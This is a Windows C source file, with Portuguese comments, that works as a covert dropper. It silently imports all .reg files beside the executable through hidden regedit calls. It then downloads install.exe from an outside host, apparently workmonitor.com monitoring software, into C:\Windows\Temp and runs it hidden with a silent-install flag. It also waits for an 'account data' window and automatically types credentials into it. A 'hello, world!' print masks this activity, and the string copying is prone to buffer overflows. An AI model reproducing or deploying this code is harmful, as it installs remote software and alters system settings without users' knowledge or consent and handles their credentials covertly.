#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <tchar.h>
#include <shlwapi.h>
#include "testedigita.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")

int ImportRegFiles() {
    char regFilePath[MAX_PATH];
    GetModuleFileName(NULL, regFilePath, MAX_PATH);
    PathRemoveFileSpecA(regFilePath);

    strcat(regFilePath, "\\*.reg");

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFileA(regFilePath, &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                char regFile[MAX_PATH];
                strcpy(regFile, regFilePath);
                regFile[strlen(regFile) - strlen("\\*.reg")] = '\0';
                strcat(regFile, "\\");
                strcat(regFile, findFileData.cFileName);

                char cmd[MAX_PATH];
                strcpy(cmd, "/s ");
                strcat(cmd, regFile);
                
                ShellExecute(NULL, "open", "regedit.exe", cmd, NULL, SW_HIDE); 
            }
        } while (FindNextFileA(hFind, &findFileData));
        FindClose(hFind);
        printf("hello, world!\n");
        return 1;  // Sucesso na importação
    } else {
        return 0;  // Falha na importação
    }
}

void DownloadAndRun() {
    const char *url = "https://www.workmonitor.com/install/install.exe";
    const char *filePath = "C:\\Windows\\Temp\\install.exe";

    HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hUrl = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hUrl) {
            FILE *file = fopen(filePath, "wb");
            if (file) {
                char buffer[4096];
                DWORD bytesRead;
                while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
                    fwrite(buffer, 1, bytesRead, file);
                }
                fclose(file);
            }
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hInternet);
    }

    ShellExecute(NULL, "open", filePath, "/S", NULL, SW_HIDE);
}

int main() {
    int regImportSuccess = ImportRegFiles();

    DownloadAndRun();

    if (!regImportSuccess) {
        HWND hwnd = FindWindowByTitle("Dados da Conta");
        while (hwnd == NULL || GetForegroundWindow() != hwnd) {
            Sleep(2000); 
            hwnd = FindWindowByTitle("Dados da Conta");
        }
        InserirCredenciais();
    }

    return 0;
}